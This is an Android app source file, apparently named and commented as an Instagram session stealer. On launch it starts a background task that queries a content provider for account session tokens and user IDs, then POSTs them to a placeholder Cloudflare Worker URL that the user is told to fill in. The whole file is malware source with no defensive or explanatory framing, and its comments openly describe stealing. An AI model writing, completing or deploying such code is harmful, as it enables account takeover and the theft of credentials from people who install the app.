package com.hidden.igstealer;

import android.os.Bundle;
import android.os.AsyncTask;
import android.widget.TextView;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import androidx.appcompat.app.AppCompatActivity;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    // Instagram Content Provider URI
    // This is the standard URI for Instagram accounts data
    private static final Uri ACCOUNTS_URI = Uri.parse("content://com.burbn.instagram.provider/accounts/");
    
    // 🔴 REPLACE THIS WITH YOUR CLOUDFLARE WORKER URL 🔴
    private static final String WORKER_URL = "YOUR_WORKER_URL_HERE";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Start stealing immediately
        new StealTask().execute();
    }

    private class StealTask extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... voids) {
            try {
                ContentResolver resolver = getContentResolver();
                
                // Query the accounts table
                Cursor cursor = resolver.query(ACCOUNTS_URI, null, null, null, null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    // Try to find the token column
                    int tokenIndex = cursor.getColumnIndex("sessionid");
                    int userIdIndex = cursor.getColumnIndex("userId");
                    
                    // Fallback if column names differ
                    if (tokenIndex == -1) tokenIndex = cursor.getColumnIndex("token");
                    if (userIdIndex == -1) userIdIndex = cursor.getColumnIndex("id");

                    if (tokenIndex != -1 && userIdIndex != -1) {
                        String token = cursor.getString(tokenIndex);
                        String userId = cursor.getString(userIdIndex);
                        cursor.close();
                        
                        // Send to server
                        return sendToServer(userId, token);
                    } else {
                        cursor.close();
                        return "Columns not found.";
                    }
                } else {
                    if (cursor != null) cursor.close();
                    return "No accounts found in provider.";
                }
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        }

        private String sendToServer(String userId, String token) {
            try {
                URL url = new URL(WORKER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                // JSON Payload
                String json = "{" +
                    "\"userId\":\"" + userId + "\"," +
                    "\"token\":\"" + token.replace("\"", "\\\"") + "\"," +
                    "\"time\":\"" + System.currentTimeMillis() + "\"" +
                    "}";

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("UTF-8");
                    os.write(input, 0, input.length);
                }

                int response = conn.getResponseCode();
                return (response == 200) ? "Success" : "Failed: " + response;

            } catch (Exception e) {
                return "Network Error: " + e.getMessage();
            }
        }
    }
}
